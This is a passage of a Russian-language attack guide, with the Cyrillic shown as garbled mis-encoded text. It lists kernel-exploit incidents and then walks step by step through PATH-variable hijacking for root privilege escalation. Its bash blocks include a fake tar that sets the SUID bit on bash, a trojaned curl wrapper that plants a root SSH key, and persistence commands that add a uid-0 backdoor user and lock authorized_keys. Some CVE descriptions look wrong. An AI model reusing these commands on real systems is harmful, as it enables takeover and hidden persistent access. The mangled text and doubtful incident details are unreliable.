   - **–°—Ç–∞—Ç—É—Å:** [ENISA Threat Landscape](https://www.enisa.europa.eu/publications/threat-landscape-for-supply-chain-attacks)  


6. **Android Rootkit via Kernel Exploit (2024)**  
   - **CVE:** CVE-2024-0032  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** Use-after-free –≤ Binder IPC –¥—Ä–∞–π–≤–µ—Ä–µ  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 1M+ —É—Å—Ç—Ä–æ–π—Å—Ç–≤ Samsung, Xiaomi, Google Pixel  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [Google Project Zero](https://googleprojectzero.blogspot.com/2024/01/android-binder-exploit.html)  


7. **VMware ESXi Zero-Day Cluster Attack (2023)**  
   - **CVE:** CVE-2023-20887  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ –¥—Ä–∞–π–≤–µ—Ä–µ vmxnet3 (–ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏–µ –±—É—Ñ–µ—Ä–∞)  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 200+ –∫–ª–∞—Å—Ç–µ—Ä–æ–≤ VMware –≤ —Ñ–∏–Ω–∞–Ω—Å–æ–≤–æ–º —Å–µ–∫—Ç–æ—Ä–µ  
   - **–û—Ç—á–µ—Ç:** [VMware Security Advisory VMSA-2023-0001](https://www.vmware.com/security/advisories/VMSA-2023-0001.html)  

---

### –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π

|  –ì–æ–¥ | CVE            | –£—è–∑–≤–∏–º–æ—Å—Ç—å                     | –ó–∞—Ç—Ä–æ–Ω—É—Ç–æ —Å–∏—Å—Ç–µ–º |
|------|----------------|--------------------------------|------------------|
| 2016 | CVE-2016-5195  | Dirty COW (race condition)     | 10M+             |
| 2021 | CVE-2021-3156  | Sudo heap overflow             | 40M+             |
| 2022 | CVE-2022-0847  | Dirty Pipe (uninit pipe flag)  | 15M+             |
| 2023 | CVE-2023-0386  | OverlayFS privilege escalation | 8M+              |
| 2024 | CVE-2024-0032  | Android Binder UAF             | 1M+ —É—Å—Ç—Ä–æ–π—Å—Ç–≤    |

---

## –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π —è–¥—Ä–∞ ‚Äî –Ω–∞–∏–±–æ–ª–µ–µ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –≤ Linux. 

**–ö–ª—é—á–µ–≤—ã–µ —Ä–∏—Å–∫–∏:**
- **–ö—Ä–∏—Ç–∏—á–Ω–æ—Å—Ç—å –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏–π:** –ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Å–∏—Å—Ç–µ–º–æ–π  
- **–°–ª–æ–∂–Ω–æ—Å—Ç—å –¥–µ—Ç–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è:** –ê—Ç–∞–∫–∏ –ø—Ä–æ–∏—Å—Ö–æ–¥—è—Ç –Ω–∞ —É—Ä–æ–≤–Ω–µ —è–¥—Ä–∞  
- **–î–æ–ª–≥–∏–π –∂–∏–∑–Ω–µ–Ω–Ω—ã–π —Ü–∏–∫–ª —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π:** –°—Ä–µ–¥–Ω–µ–µ –≤—Ä–µ–º—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ CVE ‚Äî 4.7 –≥–æ–¥–∞; Dirty COW –∞–∫—Ç–∏–≤–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Å–ø—É—Å—Ç—è 7 –ª–µ—Ç –ø–æ—Å–ª–µ –ø–∞—Ç—á–∞

---

---

# 7. –ó–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π PATH

–ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –æ–∫—Ä—É–∂–µ–Ω–∏—è `PATH` –≤ Linux –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç –ø–æ—Ä—è–¥–æ–∫ –ø–æ–∏—Å–∫–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤ –ø—Ä–∏ –≤–≤–æ–¥–µ –∫–æ–º–∞–Ω–¥—ã –≤ —Ç–µ—Ä–º–∏–Ω–∞–ª–µ. 
–ö–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–æ–¥–∏—Ç –∫–æ–º–∞–Ω–¥—É (–Ω–∞–ø—Ä–∏–º–µ—Ä, `ls`), —Å–∏—Å—Ç–µ–º–∞ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –∏–∑ `PATH` –¥–æ –ø–µ—Ä–≤–æ–≥–æ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è. 
–ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –º–∞–Ω–∏–ø—É–ª–∏—Ä–æ–≤–∞—Ç—å —ç—Ç–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π, —á—Ç–æ–±—ã –ø–æ–¥–º–µ–Ω–∏—Ç—å –ª–µ–≥–∏—Ç–∏–º–Ω—É—é –∫–æ–º–∞–Ω–¥—É —Å–≤–æ–µ–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –≤–µ—Ä—Å–∏–µ–π. 
–ï—Å–ª–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞ (SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫, cron-–∑–∞–¥–∞—á–∞ –æ—Ç root) –≤—ã–∑—ã–≤–∞–µ—Ç –∫–æ–º–∞–Ω–¥—É –±–µ–∑ —É–∫–∞–∑–∞–Ω–∏—è –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ –ø—É—Ç–∏, 
–±—É–¥–µ—Ç –∏—Å–ø–æ–ª–Ω–µ–Ω–∞ –ø–æ–¥–¥–µ–ª—å–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ –∏–∑ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º–æ–π –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–æ–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏.

**–ö–ª—é—á–µ–≤—ã–µ –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏:**
- –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è `PATH` —Å–æ–¥–µ—Ä–∂–∏—Ç —Å–ø–∏—Å–æ–∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π –¥–ª—è –ø–æ–∏—Å–∫–∞ –±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤
- –ü—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã (`SUID/SGID`, `cron-–∑–∞–¥–∞—á–∏`) –¥–æ–≤–µ—Ä—è—é—Ç –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π `PATH`
- –ü–æ–¥–º–µ–Ω–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö –∫–æ–º–∞–Ω–¥ (`ls`, `tar`, `cp`) –¥–∞–µ—Ç –ø–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å
- –ê—Ç–∞–∫–∞ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π, —Ç–æ–ª—å–∫–æ –æ—à–∏–±–∫–∏ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
- –î–µ—Ç–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–ª–æ–∂–Ω–æ –∏–∑-–∑–∞ –ª–µ–≥–∏—Ç–∏–º–Ω–æ–≥–æ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∞ –æ–ø–µ—Ä–∞—Ü–∏–π

### –ü—Ä–∏–º–µ—Ä—ã –∫–æ–º–∞–Ω–¥ –¥–ª—è –ø–æ–¥–º–µ–Ω—ã:
1. **–°–∏—Å—Ç–µ–º–Ω—ã–µ —É—Ç–∏–ª–∏—Ç—ã**:
   - `ls` - –ø—Ä–æ—Å–º–æ—Ç—Ä —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π
   - `tar` - —Ä–∞–±–æ—Ç–∞ —Å –∞—Ä—Ö–∏–≤–∞–º–∏
   - `curl`/`wget` - —Å–µ—Ç–µ–≤—ã–µ –∑–∞–ø—Ä–æ—Å—ã
   - `find` - –ø–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤
   - `systemctl` - —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–ª—É–∂–±–∞–º–∏
2. **–°–∫—Ä–∏–ø—Ç–æ–≤—ã–µ –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä—ã**:
   - `python`
   - `perl`
   - `sh`
3. **–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã**:
   - `mount`
   - `umount`
   - `useradd`

### –ê–ª–≥–æ—Ä–∏—Ç–º —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏:
1. **–ü–æ–∏—Å–∫ —Ü–µ–ª–µ–≤—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º**  
   - –ù–∞–π—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–º—ã (SUID/SGID, cron-—Å–∫—Ä–∏–ø—Ç—ã), –∫–æ—Ç–æ—Ä—ã–µ –≤—ã–∑—ã–≤–∞—é—Ç –∫–æ–º–∞–Ω–¥—ã –±–µ–∑ –∞–±—Å–æ–ª—é—Ç–Ω—ã—Ö –ø—É—Ç–µ–π, –∏ –∑–∞–ø—É—Å–∫–∞—é—Ç—Å—è —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏
2. **–ö–æ–º–ø–∏–ª—è—Ü–∏—è –∏ —É—Å—Ç–∞–Ω–æ–≤–∫–∞ SUID**
3. **–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã**
   - –°–æ–∑–¥–∞—Ç—å –≤ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, `/tmp`) —Ñ–∞–π–ª —Å –∏–º–µ–Ω–µ–º —Ü–µ–ª–µ–≤–æ–π –∫–æ–º–∞–Ω–¥—ã (—Ñ–∞–π–ª –¥–æ–ª–∂–µ–Ω –∑–∞–ø—É—Å–∫–∞—Ç—å —à–µ–ª–ª —Å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π)
   - –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–∞–≤ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –¥–ª—è —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞
4. **–ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π PATH**
   - –î–æ–±–∞–≤–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é —Å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –∫–æ–º–∞–Ω–¥–æ–π –≤ –Ω–∞—á–∞–ª–æ `PATH`
5. **–ó–∞–ø—É—Å–∫ —É—è–∑–≤–∏–º–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã**
   - –£—è–∑–≤–∏–º–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞ –≤—ã–∑–æ–≤–µ—Ç –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç, –Ω–æ –≤–º–µ—Å—Ç–æ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ –∏—Å–ø–æ–ª–Ω–∏—Ç—Å—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –∏–∑ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏, –∑–∞–ø—É—Å—Ç–∏–≤ root-—à–µ–ª–ª

---

## MITRE ATT&CK

**[T1574.007]**  
**Hijack Execution Flow: Path Interception by PATH Environment Variable**  
üîó https://attack.mitre.org/techniques/T1574/007/

–ê—Ç–∞–∫—É—é—â–∏–π –∏–∑–º–µ–Ω—è–µ—Ç –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é `PATH`, —á—Ç–æ–±—ã –ø–µ—Ä–µ—Ö–≤–∞—Ç–∏—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ª–µ–≥–∏—Ç–∏–º–Ω—ã—Ö –∫–æ–º–∞–Ω–¥. 
–¢–µ—Ö–Ω–∏–∫–∞ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–∞, –µ—Å–ª–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞ –≤—ã–∑—ã–≤–∞–µ—Ç –≤–Ω–µ—à–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã –±–µ–∑ –∞–±—Å–æ–ª—é—Ç–Ω—ã—Ö –ø—É—Ç–µ–π.

### –≠—Ç–∞–ø—ã –∞—Ç–∞–∫–∏ [T1574.007]

#### 1. [TA0007] ‚Äì Discovery (–†–∞–∑–≤–µ–¥–∫–∞)
> –ü–æ–∏—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º, –≤—ã–∑—ã–≤–∞—é—â–∏—Ö –∫–æ–º–∞–Ω–¥—ã –±–µ–∑ –∞–±—Å–æ–ª—é—Ç–Ω—ã—Ö –ø—É—Ç–µ–π

```bash
# –ü–æ–∏—Å–∫ SUID/SGID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤
find / -perm -4000 -type f 2>/dev/null

# –ü–æ–∏—Å–∫ cron-–∑–∞–¥–∞—á —Å –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–º–∏ –ø—É—Ç—è–º–∏
grep -rE " [a-z]+[^/]" /etc/cron* 2>/dev/null | grep -v "#" | grep -v "/usr" | grep -v "/bin"

# –ü–æ–∏—Å–∫ —Å–∫—Ä–∏–ø—Ç–æ–≤, –∑–∞–ø—É—Å–∫–∞–µ–º—ã—Ö –æ—Ç root (–≤ /etc/cron.d, /etc/cron.hourly)
grep -r "bin/" /etc/cron* 2>/dev/null | grep -v "#" | grep -v "/usr/bin" | grep -v "/bin/"

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –Ω–∞ –∑–∞–ø–∏—Å—å –≤ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
find / -writable 2>/dev/null | grep -E "bin|sbin|usr|etc"
```

---

#### 2. [TA0004] ‚Äì Privilege Escalation (–ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π)
> –ü–æ–¥–º–µ–Ω–∞ –∫–æ–º–∞–Ω–¥—ã –∏ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π `PATH`

```bash
# –í—Ä–µ–¥–æ–Ω–æ—Å–Ω–∞—è –≤–µ—Ä—Å–∏—è tar
mkdir -p /tmp/.exploit  # –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ (/tmp/.exploit) –¥–ª—è —Ä–∞–∑–º–µ—â–µ–Ω–∏—è —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤
echo '#!/bin/bash' > /tmp/.exploit/tar  # –°–æ–∑–¥–∞–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ —Å –∏–º–µ–Ω–µ–º tar (—Å–∫—Ä–∏–ø—Ç –¥–æ–ª–∂–µ–Ω –∏—Å–ø–æ–ª–Ω—è—Ç—å—Å—è —á–µ—Ä–µ–∑ Bash)
echo 'chmod u+s /bin/bash' >> /tmp/.exploit/tar  # –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ (—É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç SUID-–±–∏—Ç –Ω–∞ /bin/bash (chmod u+s), —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ª—é–±–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –∑–∞–ø—É—Å–∫–∞—Ç—å Bash —Å –ø—Ä–∞–≤–∞–º–∏ –≤–ª–∞–¥–µ–ª—å—Ü–∞ (root))
chmod +x /tmp/.exploit/tar  # –î–µ–ª–∞–µ—Ç —Å–∫—Ä–∏–ø—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º (–ë–µ–∑ —ç—Ç–æ–≥–æ —à–∞–≥–∞ —Å–∏—Å—Ç–µ–º–∞ –Ω–µ —Å–º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å–∫—Ä–∏–ø—Ç –∫–∞–∫ –ø—Ä–æ–≥—Ä–∞–º–º—É)
export PATH="/tmp/.exploit:$PATH"  # –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π PATH (–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è /tmp/.exploit –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è –≤ –Ω–∞—á–∞–ª–æ PATH, –∏ –ø—Ä–∏ –≤–≤–æ–¥–µ –ª—é–±–æ–π –∫–æ–º–∞–Ω–¥—ã —Å–∏—Å—Ç–µ–º–∞ —Å–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —ç—Ç–æ—Ç –ø—É—Ç—å) 
```

---

#### 3. [TA0002] ‚Äì Execution (–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞)
> –ó–∞–ø—É—Å–∫ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã, –≤—ã–∑—ã–≤–∞—é—â–µ–π –ø–æ–¥–¥–µ–ª—å–Ω—É—é –∫–æ–º–∞–Ω–¥—É

```bash
tar -cf backup.tar /data  # –∑–∞–ø—É—Å–∫ SUID-—Å–∫—Ä–∏–ø—Ç–∞ –±—ç–∫–∞–ø–∞
# –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è /tmp/.exploit/tar –≤–º–µ—Å—Ç–æ /bin/tar
```

---

#### 4. [TA0003] ‚Äì Persistence (–ó–∞–∫—Ä–µ–ø–ª–µ–Ω–∏–µ)
> –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –ø–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è root

```bash
# –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
echo 'backdoor:$6$salt$hash:0:0::/root:/bin/bash' >> /etc/passwd

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–∫—Ä—ã—Ç–æ–≥–æ SSH-–¥–æ—Å—Ç—É–ø–∞
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3Nz...' >> /root/.ssh/authorized_keys
chattr +i /root/.ssh/authorized_keys
```

---

### –ö–ª—é—á–µ–≤—ã–µ –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏ –∞—Ç–∞–∫–∏

1. **–ù–µ–≤–∏–¥–∏–º–æ—Å—Ç—å**:
   - –ü–æ–¥–º–µ–Ω–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –≤—ã–∑–æ–≤–µ –∫–æ–º–∞–Ω–¥ –±–µ–∑ –∞–±—Å–æ–ª—é—Ç–Ω—ã—Ö –ø—É—Ç–µ–π
   - –õ–µ–≥–∏—Ç–∏–º–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –ø—Ä–∏ —è–≤–Ω–æ–º —É–∫–∞–∑–∞–Ω–∏–∏ –ø—É—Ç–∏ (`/bin/tar`)
2. **–ö–æ–Ω—Ç–µ–∫—Å—Ç–æ–∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å**:
   - –≠–∫—Å–ø–ª–æ–π—Ç –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –≤—ã–∑–æ–≤–µ —É—è–∑–≤–∏–º–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã
   - –í –æ—Å—Ç–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è —Å–∏—Å—Ç–µ–º–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–æ—Ä–º–∞–ª—å–Ω–æ
3. **–ú–Ω–æ–≥–æ—Ä–∞–∑–æ–≤–æ—Å—Ç—å**:
   - –ú–æ–∂–Ω–æ –ø–æ–¥–º–µ–Ω–∏—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –∫–æ–º–∞–Ω–¥ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ
   ```bash
   ln -s /tmp/.exploit/malicious /tmp/.exploit/tar
   ln -s /tmp/.exploit/malicious /tmp/.exploit/curl
   ln -s /tmp/.exploit/malicious /tmp/.exploit/wget
   ```
4. **–î–∏–Ω–∞–º–∏—á–µ—Å–∫–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞**:
   - –°–∫—Ä–∏–ø—Ç –º–æ–∂–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Å–ª–æ–∂–Ω—É—é –ª–æ–≥–∏–∫—É:
   ```bash
   echo '#!/bin/bash' > /tmp/.exploit/target_cmd
   echo 'if [ "$EUID" -eq 0 ]; then' >> /tmp/.exploit/target_cmd
   echo '    # –î–µ–π—Å—Ç–≤–∏—è –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –æ—Ç root' >> /tmp/.exploit/target_cmd
   echo '    chmod u+s /bin/bash' >> /tmp/.exploit/target_cmd
   echo 'else' >> /tmp/.exploit/target_cmd
   echo '    # –î–µ–π—Å—Ç–≤–∏—è –ø—Ä–∏ –æ–±—ã—á–Ω–æ–º –∑–∞–ø—É—Å–∫–µ' >> /tmp/.exploit/target_cmd
   echo '    /usr/bin/target_cmd_real "$@"' >> /tmp/.exploit/target_cmd
   echo 'fi' >> /tmp/.exploit/target_cmd
   ```

## –ü—Ä–∏–º–µ—Ä—ã –∞—Ç–∞–∫

### –ü—Ä–∏–º–µ—Ä 1: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è cron-–∑–∞–¥–∞—á–∏ —Å `curl`
> –ï—Å—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–π —Å–∫—Ä–∏–ø—Ç `/etc/cron.hourly/log_upload`, –∫–æ—Ç–æ—Ä—ã–π –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∫–∞–∂–¥—ã–π —á–∞—Å –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è **root**:
> –°–∫—Ä–∏–ø—Ç –≤—ã–∑—ã–≤–∞–µ—Ç `curl` –±–µ–∑ —É–∫–∞–∑–∞–Ω–∏—è –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ –ø—É—Ç–∏ (`/usr/bin/curl`), –ø–æ–ª–∞–≥–∞—è—Å—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –æ–∫—Ä—É–∂–µ–Ω–∏—è PATH.
```bash
#!/bin/bash
curl -F "log=@/var/log/app.log" http://logs.example.com/upload
```

---

#### –®–∞–≥ 1: –ü–æ–∏—Å–∫ —É—è–∑–≤–∏–º—ã—Ö cron-–∑–∞–¥–∞—á
> –ù–∞–π—Ç–∏ cron-–∑–∞–¥–∞—á–∏, –≥–¥–µ –∫–æ–º–∞–Ω–¥—ã –≤—ã–∑—ã–≤–∞—é—Ç—Å—è –±–µ–∑ –∞–±—Å–æ–ª—é—Ç–Ω—ã—Ö –ø—É—Ç–µ–π
```bash
grep -r " [a-z]+[^/]" /etc/cron.* 2>/dev/null
# –í—ã–≤–æ–¥:
# /etc/cron.hourly/log_upload: curl -F "log=@/var/log/app.log" http://logs.example.com/upload
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
- `grep -r`: –†–µ–∫—É—Ä—Å–∏–≤–Ω—ã–π –ø–æ–∏—Å–∫ –ø–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è–º
- `" [a-z]+[^/]"`: –†–µ–≥—É–ª—è—Ä–Ω–æ–µ –≤—ã—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è –ø–æ–∏—Å–∫–∞ —Å–ª–æ–≤ –±–µ–∑ —Å–ª–µ—à–∞ (–ø—Ä–∏–∑–Ω–∞–∫ –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ–≥–æ –ø—É—Ç–∏)
- `2>/dev/null`: –ü–æ–¥–∞–≤–ª–µ–Ω–∏–µ –æ—à–∏–±–æ–∫ –¥–æ—Å—Ç—É–ø–∞

---

#### –®–∞–≥ 2: –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ curl
```bash
# –°–æ–∑–¥–∞–µ–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –¥–ª—è —ç–∫—Å–ø–ª–æ–π—Ç–∞
mkdir -p /home/user/.local/bin

# –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π curl
cat > /home/user/.local/bin/curl <<'EOF'
#!/bin/bash

# –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞:
# 1. –î–æ–±–∞–≤–ª—è–µ–º SSH-–∫–ª—é—á –≤ authorized_keys root
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 2. –ó–∞–ø—É—Å–∫–∞–µ–º –Ω–∞—Å—Ç–æ—è—â–∏–π curl
/usr/bin/curl "$@"
EOF

chmod +x /home/user/.local/bin/curl
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
  1. **–°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏:**
    - `mkdir -p /home/user/.local/bin`: –°–æ–∑–¥–∞–µ—Ç —Å–∫—Ä—ã—Ç—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –≤ –¥–æ–º–∞—à–Ω–µ–º –∫–∞—Ç–∞–ª–æ–≥–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
